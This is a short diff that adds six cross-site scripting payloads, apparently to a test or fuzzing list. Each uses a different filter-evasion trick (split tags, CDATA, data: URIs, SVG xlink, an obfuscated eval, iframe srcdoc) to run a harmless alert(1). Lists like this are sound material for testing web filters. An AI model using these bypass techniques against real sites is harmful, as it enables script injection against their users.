@@ -1,0 +1,6 @@
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script>/*<![CDATA[*/alert(1)//]]></script>
+<script src=data:text/javascript,alert(1)></script>
+<svg><script xlink:href=data:text/javascript,alert(1)></script></svg>
+<img src=x onerror=eval('al'+'ert(1)')>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
